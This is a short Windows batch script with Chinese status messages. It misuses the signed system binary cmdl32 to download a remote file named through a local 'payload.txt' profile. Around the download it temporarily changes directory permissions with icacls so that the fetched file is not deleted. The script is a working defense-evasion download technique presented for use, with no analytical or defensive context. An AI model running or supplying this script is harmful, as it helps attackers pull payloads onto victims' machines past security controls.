chcp 65001
@echo off
set tmp=%cd%
icacls %cd% /inheritance:d /Q /C /deny everyone:(OI)(CI)(DE,DC)
cls
echo 正在下载文件
cmdl32 /vpn /lan %cd%\payload.txt
echo 文件已下载完毕，请按回车恢复目录权限以操作文件！
pause>nul
icacls %cd% /remove:d everyone